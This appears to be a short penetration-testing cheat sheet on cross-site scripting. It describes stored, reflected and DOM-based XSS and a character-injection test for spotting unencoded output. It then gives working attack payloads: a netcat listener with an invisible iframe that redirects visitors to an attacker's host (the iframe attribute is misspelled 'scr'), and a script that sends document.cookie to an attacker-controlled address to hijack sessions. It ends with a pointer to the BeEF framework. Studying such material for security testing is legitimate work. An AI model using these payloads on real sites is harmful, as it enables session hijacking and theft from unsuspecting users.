# XSS

> Cross-site Scripting (XSS) is a client-side code injection attack. The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application.

```bash
#The famous test script:
<script>alert('test')</script>
```

## Types of XSS

**Applications should sanitize all user inputs. Else, we can try to execute code.**

### Stored XSS:

Persistent XSS stored in a database. Every user who access the vulnerable page will receive the payload. Examples are: Forums and comment sections.

### Reflected XSS:

The payload is included in the URL. It only affects people accessing the malicious link. Example: Search bars.

### DOM-Based XSS:

Where content of an input is used to change something in the page. Example: Changing the background input.

_____

## Detecting XSS

In a persistent XSS, where we insert some input that will be stored in a database (like a forum or a comment section), we can try to add special characters in order to test how the application threats those characters.

For example, inserting the following in a comment section:

```bash
< > ; ""
```

If we inspect the results in the browser developer console and we see that these characters are not encoded, it's likely that the page is vulnerable to XSS.

_____

## Redirecting with XSS

Once we identify an XSS vulnerability, we can insert an invisible iframe in the page in order to redirect the client to our location.

```JavaScript
//Setup listener in attacker machine:
nc -nlvp $PORT
//Invisilble iframe to inject in the vulnerable page:
<iframe scr=$URL height="0" width="0"></iframe>
```

_____

## Stealing Cookies

If HttpOnly (deny JavaScript access cookies) cookie flag is not set, we can modify the payload to hijack user cookies (we should review other browser security controls, not only HttpOnly):

```JavaScript
<script>new Image().src="http://$IPADDRESS/image.jpg?output="+document.cookie;</script>
```

_____

## BeEF
> BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors.
